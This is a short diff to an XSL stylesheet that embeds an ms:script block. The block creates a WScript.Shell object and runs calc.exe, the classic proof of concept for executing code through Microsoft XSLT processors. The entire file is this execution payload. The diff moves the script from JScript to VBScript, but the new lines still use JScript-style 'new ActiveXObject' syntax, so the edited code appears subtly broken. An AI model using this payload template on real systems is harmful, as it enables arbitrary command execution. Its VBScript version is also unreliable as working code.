@@ -4,8 +4,9 @@ xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com
 xmlns:user="placeholder"
 version="1.0">
 <output method="text"/>
-  <ms:script implements-prefix="user" language="Jscript">
+  <ms:script implements-prefix="user" language="VBscript">
   <![CDATA[
-  var x = new ActiveXObject("WScript.Shell").Run("calc.exe");
+  set x = new ActiveXObject("WScript.Shell")
+  x.run("calc.exe")
   ]]></ms:script>
 </stylesheet>
